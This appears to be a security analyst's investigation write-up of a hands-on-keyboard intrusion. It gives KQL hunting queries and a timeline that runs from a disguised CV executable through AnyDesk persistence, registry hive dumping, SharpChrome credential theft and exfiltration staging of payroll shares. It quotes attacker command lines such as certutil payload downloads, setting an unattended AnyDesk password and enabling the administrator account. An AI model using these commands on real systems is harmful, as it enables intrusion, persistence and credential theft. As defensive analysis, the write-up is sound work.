
# Alert - Compromised account conducting hands on keyboard attack

<img width="859" height="200" alt="Pasted image 20260225170216" src="https://github.com/user-attachments/assets/202a9d5b-8b5e-48fe-8c7c-a1c9139dbf0f" />

#### Artifacts
**Alert Timestamp:** `Jan 14, 2026 9:08:27.367 PM`
**Devices**: `as-pc1`, `as-pc2`, `as-srv`
**Users**: `Sophie.Turner`, `David Mitchell`
**Malicious file**: Daniel_Richardson_CV.pdf.exe `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5`

---

<img width="378" height="135" alt="Pasted image 20260225211152" src="https://github.com/user-attachments/assets/9a414ea5-6462-4604-b5c1-ed6fb0f824ab" />

Explorer.exe spawned file `daniel_richardson_cv.pdf.exe`. 

Initial Execution time at `1/14/26 7:31:53 PM`

---

<img width="1144" height="735" alt="Pasted image 20260225213100" src="https://github.com/user-attachments/assets/066cdd2f-2a35-4440-8a89-321587c66335" />


Malicious PDF.exe leveraged multiple native Windows processes to establish persistence, create a backdoor admin account, and deployed `AnyDesk` for remote access.

---

<img width="1051" height="450" alt="Pasted image 20260225212745" src="https://github.com/user-attachments/assets/577477cd-7bb0-491a-8d1a-c01decd3677e" />


Malicious `pdf.exe` additionally spawned an instance of notepad.exe which loaded the CLR module `SharpChrome`

<img width="865" height="351" alt="Pasted image 20260226130131" src="https://github.com/user-attachments/assets/21d1f375-e3cb-4a82-820b-155f2a960720" />

> https://github.com/zzhsec/SharpChrome

<img width="970" height="665" alt="Pasted image 20260225214048" src="https://github.com/user-attachments/assets/842d05cb-3b0e-41cd-be88-c0dd46a5142a" />


**Alerts aligned with the described tool behavior**

---

<img width="653" height="635" alt="Pasted image 20260226130022" src="https://github.com/user-attachments/assets/ca628ede-f721-4bc9-b8aa-52d6f75ed3ec" />


Observed attempted defense evasion by clearing event logs via `wevutil.exe` CLI

---
```kql
let lookback = 90d;
DeviceNetworkEvents
| where TimeGenerated >= ago(lookback)
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName contains "anydesk" 
    or InitiatingProcessFileName contains "daniel_richardson"
| project TimeGenerated, InitiatingProcessFileName, RemoteUrl, RemoteIP, RemotePort
| sort by TimeGenerated asc
```
<img width="1321" height="231" alt="Pasted image 20260225215709" src="https://github.com/user-attachments/assets/3cd825c5-a847-4f22-bf22-480843312a08" />

Observed multiple outbound connections initiated from the malicious binary to external domain `cdn[.]cloud[.]endpoint[.]net` with activity beginning at `1/15/26 3:47 AM`

---
```kql
DeviceFileEvents
// | where DeviceName == "as-pc1"
| where FileName contains "daniel_richardson"
| project TimeGenerated, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
```
<img width="1577" height="258" alt="Pasted image 20260225225110" src="https://github.com/user-attachments/assets/7453c1fd-4a2b-4150-ba3b-2b7244b71d0a" />

Observed `certutil` used as a LOLbin to download the pdf.exe payload from `sync.cloud-endpoint.net` at `1/15/26 4:52 AM`

The payload obfuscated as a legitimate windows process `RunTimeBroker` and saved to a world-writeable directory

``certutil.exe -urlcache -split -f``

>Note: This is under `David.Mitchell`'s profile on `as-pc2`, not `Sophie.Turner` indicative of potential lateral movement from additional compromised account

---
```kql
DeviceProcessEvents
| where DeviceName == "as-pc1"
| where ProcessCommandLine contains "reg"
| where InitiatingProcessFileName contains "powershell"
| project TimeGenerated, ProcessCommandLine, InitiatingProcessFileName
```
<img width="1423" height="236" alt="Pasted image 20260225233224" src="https://github.com/user-attachments/assets/1c6f76b5-17bb-4360-a464-1e64bc8057a0" />

Attacker leveraged `powershell.exe` to dump `HKLM\SAM` and `HKLM\SYSTEM` registry hives to `C:\Users\Public` for offline credential extraction at `1/15/26 4:13pm`

> Alternative query for a more holistic view 

```kql
DeviceProcessEvents
| where AccountName in ("sophie.turner", "david.mitchel", "as.srv.administrator")
//| where ProcessCommandLine has_any ("psexec", "wmic", "paexec", "winrm", "invoke-command", "enter-pssession", "sc.exe \\")
| where InitiatingProcessFileName in ("powershell.exe", "cmd.exe")
| project TimeGenerated, AccountName, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
| sort by TimeGenerated asc
```

<img width="1277" height="377" alt="Pasted image 20260226142532" src="https://github.com/user-attachments/assets/0360c705-0eea-4be9-b68c-94a090289e76" />

---

<img width="317" height="335" alt="Pasted image 20260225233952" src="https://github.com/user-attachments/assets/6cff9b51-2473-4b26-b55a-db01d7230d15" />

Observed commands indicative of host and network reconnaissance

---
```kql
DeviceProcessEvents
| where DeviceName == "as-pc1"
| where ProcessCommandLine contains "Anydesk"
| project AccountName,InitiatingProcessFileName, InitiatingProcessSHA256
```
<img width="1252" height="160" alt="Pasted image 20260225234858" src="https://github.com/user-attachments/assets/f2d44118-828f-40da-91ad-be7a5cf08e4c" />

>`Anydesk SHA256: f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532`

Legitimate remote administration tool `AnyDesk` deployed by the malicious pdf.exe in attempt to establish persistent access

---

<img width="1416" height="131" alt="Pasted image 20260226125031" src="https://github.com/user-attachments/assets/86192d38-9a67-49aa-8d40-b91d2579a0d6" />

`Anydesk` was downloaded using the native windows binary `certutil` at `Jan 14 8:08 PM`

CommandLine:

`cmd.exe /c "certutil -urlcache -split -f https://download.anydesk.com/AnyDesk.exe C:\Users\Public\AnyDesk.exe"`

---

<img width="1306" height="126" alt="Pasted image 20260226124519" src="https://github.com/user-attachments/assets/18bae82c-c3ba-4de0-aaf6-45f863497ff5" />

After installation a configuration file was accessed at `1/14/26 8:11 PM`

`C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf`

---

<img width="1362" height="141" alt="Pasted image 20260226125641" src="https://github.com/user-attachments/assets/53a2a856-7e53-443f-b5a1-f79f36c058cb" />

**Unattended access was configured for the remote tool**

`cmd.exe /c "echo intrud3r! | C:\Users\Public\AnyDesk.exe --set-password"`

---
```kql
DeviceFileEvents
| where SHA256 == "f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532"
| sort by TimeGenerated asc 
```

<img width="1304" height="399" alt="Pasted image 20260226130606" src="https://github.com/user-attachments/assets/109f8541-53b7-447d-8511-ebfacb6aa3fb" />

**The remote tool was installed across multiple hosts in the following order indicative of lateral movement**

`as-pc1` >  `as-pc2` > `as-srv`

---
```kql
DeviceProcessEvents
// | where AccountName in ("sophie.turner", "david.mitchel", "as.srv.administrator")
| where DeviceName in ("as-pc1", "as-pc2", "as-srv")
| where InitiatingProcessFileName in ("powershell.exe", "cmd.exe")
| where AccountName !in ("local service", "system")
| project TimeGenerated, AccountName, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
| sort by TimeGenerated desc 
```

<img width="1257" height="250" alt="Pasted image 20260226143855" src="https://github.com/user-attachments/assets/7866fe10-03ca-4ee3-89ee-a6a47114da41" />

Observed multiple failed lateral movement attempts with `wmic.exe` and `psexec.exe` with activity beginning at  `1/15/2026, 4:18:44 AM`

---

<img width="1515" height="461" alt="Pasted image 20260226230852" src="https://github.com/user-attachments/assets/fe493f5b-6e68-40a9-a08d-0b229ae606e7" />

Observed `sophie.turner;as-pc1` running commands `ARP`, `net view`, and `PING` indicative of additional network reconnaissance**

Following enumeration of live hosts `as-pc2`, and `as-srv`, the attacker attempted RDP (mstsc.exe) to `10[.]1[.]0[.]183` at `1/15/2026, 4:29 AM` and `10[.]1[.]0[.]203` at `1/15/2026, 4:34 AM`

`DeviceNetworkEvents` show the attacker successfully authenticated as `david.mitchell` on `as-pc2` at `1/15/2026, 4:40:31 AM`

<img width="1609" height="105" alt="Pasted image 20260227000458" src="https://github.com/user-attachments/assets/16161092-9d1e-40de-8f6d-eb675b5da65b" />

The local administrator was then enabled via `net user Administrator /active:yes` with a configured password at `1/15/2026, 4:40 AM`

<img width="1031" height="220" alt="Pasted image 20260226233055" src="https://github.com/user-attachments/assets/477c9310-a5a3-454a-97af-33917248cd83" />

- `certutil` downloaded and executed `Anydesk` at `1/15/26 4:40 AM`

<img width="1265" height="257" alt="Pasted image 20260226230448" src="https://github.com/user-attachments/assets/86174aa6-9d2c-42a1-a260-912a3b33f9c3" />


- `certutil` contacted the attacker domain and download the malicious payload as seen previously on `as-pc1` at `1/15/2026 4:52 AM`
- Payload obfuscated a benign windows process. This behavior mirrors the activity seen on patient-zero confirming lateral movement success.

---

<img width="1057" height="200" alt="Pasted image 20260226233631" src="https://github.com/user-attachments/assets/2ce12a41-130b-4ec7-9d41-10448fe89dcb" />

At `1/15/26 4:52 AM` a scheduled task named obfuscated as `MicrosoftEdgeUpdateCheck` was set to execute the attackers malicious binary disguised as a legitimate windows process 

The malicious binary was set to execute daily during off hours at 3 AM with the highest privileges

---
```kql
DeviceProcessEvents
// | where AccountName in ("sophie.turner", "david.mitchel", "as.srv.administrator")
| where DeviceName in ("as-pc1", "as-pc2", "as-srv")
//| where InitiatingProcessFileName in ("powershell.exe", "cmd.exe")
| where ProcessCommandLine has_any ("net", "user", "/add")
| where AccountName !in ("local service", "system")
| project TimeGenerated, AccountName, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
| sort by TimeGenerated desc 
```
<img width="1381" height="163" alt="Pasted image 20260227000704" src="https://github.com/user-attachments/assets/5775f3b2-4533-4854-be1b-aaabd658d744" />

The attacker pivoted back to patient-zero and created a new obfuscated local account named `svc_backup` and added it to the `Administrators` group at `1/15/2026, 4:57:47 AM`

---
```kql
DeviceFileEvents
| where InitiatingProcessAccountName in ("sophie.turner", "david.mitchel", "as.srv.administrator")
| where DeviceName == "as-srv"
| where InitiatingProcessFileName != "cleanmgr.exe"
//| where InitiatingProcessFileName in ("certutil", "explorer.exe", "7zg.exe", "powershell.exe", "cmd.exe")
//| where ActionType == "FileModified"
//| project TimeGenerated, DeviceName, ActionType, InitiatingProcessFileName, PreviousFileName, FileName, FileSize, FolderPath
| sort by TimeGenerated desc 
```
<img width="1178" height="141" alt="Pasted image 20260227013254" src="https://github.com/user-attachments/assets/712ff5ea-2821-45b4-a674-ec359a6a3f06" />

`RuntimeBroker.exe` > `Anydesk.exe` > `Shares.7z`

Observed a large archive file `Shares.7z` (194669 bytes) created following the previously seen malicious binaries

---
```kql
DeviceFileEvents
| where DeviceName == "as-srv"
//| where FolderPath contains "shares"
| where FolderPath contains "C:\\Shares"
| project TimeGenerated, ActionType, FileName, FileSize, SHA256
| sort by TimeGenerated desc 
```
<img width="935" height="514" alt="Pasted image 20260227020434" src="https://github.com/user-attachments/assets/2f60be4d-9920-485c-b7d4-b316a1d5a725" />

Observed multiple file opening and modifications to `BACS_Payments_Dec2025.ods` before archiving all share contents into `Shares.7z` at `1/15/2026 4:59 AM`

---
```kql
DeviceProcessEvents
// | where DeviceName == "as-pc1"
| where DeviceName == "as-pc2"
| where ProcessCommandLine contains "as-srv"
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc
```
<img width="1349" height="170" alt="Pasted image 20260227015814" src="https://github.com/user-attachments/assets/7c25db6f-4ece-4650-95af-bd5e56284d0f" />


`david.mitchell` on `as-pc2` opened `BACS_Payments_Dec2025.ods` directly from the `AS-SRV` payroll share via LibreOffice at `1/15/2026, 4:53 AM`

---

<img width="1210" height="377" alt="Pasted image 20260227021611" src="https://github.com/user-attachments/assets/d8f9efe6-3956-4063-bc1a-c38b58658d02" />


`SharpChrome` reflectively loaded into `notepad.exe` via CLR, then used DPAPI to decrypt and access stored browser credentials at `1/15/2026, 5:09 AM`

---

## Approximate Attack Timeline

#### **January 14, 2026**

- **7:31:53 PM** – `explorer.exe` spawns `Daniel_Richardson_CV.pdf.exe` on `as-pc1` (Initial execution / patient zero).
    
- **8:08 PM** – `certutil.exe` downloads `AnyDesk.exe` to `C:\Users\Public\AnyDesk.exe` on `as-pc1`.
    
- **8:11 PM** – AnyDesk configuration file accessed:
    
    - `C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf`
        
- **~8:11 PM** – Unattended access configured:
    
    - `echo intrud3r! | AnyDesk.exe --set-password`
        
- **~Evening (post-execution)** – Malicious binary spawns `notepad.exe` and reflectively loads `SharpChrome` CLR module (browser credential harvesting begins).
    
- **~Evening** – Event logs cleared via `wevtutil.exe` (Security, System, Application logs).
#### **January 15, 2026**

- **3:47 AM** – Outbound connections from malicious binary to:
    
    - `cdn.cloud.endpoint.net` (external C2 activity begins).
        
- **4:13 AM** – PowerShell dumps:
    
    - `HKLM\SAM`
        
    - `HKLM\SYSTEM`
        
    - Registry hives saved to `C:\Users\Public` (credential extraction staging).
        
- **4:18:44 AM** – Multiple failed lateral movement attempts using:
    
    - `wmic.exe`
        
    - `psexec.exe`
        
- **4:29 AM** – RDP attempt (`mstsc.exe`) from `as-pc1` to:
    
    - `10.1.0.183`
        
- **4:34 AM** – RDP attempt to:
    
    - `10.1.0.203`
        
- **4:40:00 AM** – Successful authentication as `david.mitchell` on `as-pc2`.
    
- **4:40 AM** – Built-in Administrator account enabled:
    
    - `net user Administrator /active:yes`
        
- **4:40 AM** – `certutil` downloads and executes `AnyDesk` on `as-pc2`.
    
- **4:52 AM** – `certutil` contacts attacker domain and downloads malicious payload to `as-pc2`:
    
    - Obfuscated as `RuntimeBroker`
        
    - Saved to world-writeable directory
        
- **4:52 AM** – Scheduled task created:
    
    - Name: `MicrosoftEdgeUpdateCheck`
        
    - Executes malicious binary daily at 3 AM
        
    - Runs with highest privileges
        
- **4:53 AM** – `david.mitchell` on `as-pc2` opens:
    
    - `BACS_Payments_Dec2025.ods`
        
    - Directly from `AS-SRV` payroll share (data targeting phase begins)
        
- **4:57:47 AM** – Attacker pivots back to `as-pc1`:
    
    - Creates local account `svc_backup`
        
    - Adds account to `Administrators` group
        
- **4:59 AM** – On `as-srv`:
    
    - Multiple file modifications to `BACS_Payments_Dec2025.ods`
        
    - Share contents archived into `Shares.7z`
        
    - Archive size: 194,669 bytes
        
    - Process chain: `RuntimeBroker.exe` → `AnyDesk.exe` → `Shares.7z`
        
- **5:09 AM** – `SharpChrome` reflectively loaded into `notepad.exe`
    
    - DPAPI decryption performed
        
    - Stored browser credentials accessed
